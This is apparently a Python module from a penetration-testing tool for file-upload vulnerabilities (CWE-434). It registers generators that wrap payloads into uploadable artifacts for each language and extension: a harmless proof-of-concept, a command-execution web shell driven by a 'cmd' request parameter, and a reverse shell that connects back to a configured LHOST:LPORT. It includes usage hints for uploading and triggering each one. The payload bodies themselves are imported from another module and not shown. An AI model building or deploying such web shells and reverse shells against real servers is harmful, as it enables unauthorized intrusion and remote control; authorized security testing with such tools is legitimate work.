"""Code-execution payloads: PoC (safe), RCE (active), reverse shells (active)."""
from __future__ import annotations

from ..core import register, Context
from .. import payloads
from ._util import code_artifact


@register("poc", category="code-exec", risk="safe",
          description="Harmless proof that uploaded code executes.",
          reference="CWE-434")
def poc(ctx: Context):
    for lang in ctx.langs():
        code = payloads.POC.get(lang)
        if not code:
            continue
        for ext in ctx.target.extensions:
            yield code_artifact(
                ctx, lang, ext, "poc", code,
                category="code-exec", risk="safe",
                description="Prints a confirmation string if executed.",
                usage="Upload, then request it; a confirmation string = RCE.",
                reference="CWE-434",
            )


@register("rce", category="code-exec", risk="active",
          description="Command execution via a request parameter.",
          reference="CWE-434")
def rce(ctx: Context):
    for lang in ctx.langs():
        code = payloads.RCE.get(lang)
        if not code:
            continue
        for ext in ctx.target.extensions:
            yield code_artifact(
                ctx, lang, ext, "rce", code,
                category="code-exec", risk="active",
                description="Runs an attacker-supplied command (param 'cmd').",
                usage="Upload, then request with ?cmd=id (or argv).",
                reference="CWE-434",
            )


@register("revshell", category="code-exec", risk="active",
          description="Interactive reverse shell back to LHOST:LPORT.",
          reference="CWE-434")
def revshell(ctx: Context):
    if not ctx.lhost or not ctx.lport:
        return  # no listener configured; silently skip
    for lang in ctx.langs():
        code = payloads.revshell(lang, ctx.lhost, ctx.lport)
        if not code:
            continue
        for ext in ctx.target.extensions:
            yield code_artifact(
                ctx, lang, ext, "revshell", code,
                category="code-exec", risk="active",
                description=f"Connects back to {ctx.lhost}:{ctx.lport}.",
                usage=f"Start a listener on {ctx.lport}, upload, then trigger.",
                reference="CWE-434",
            )
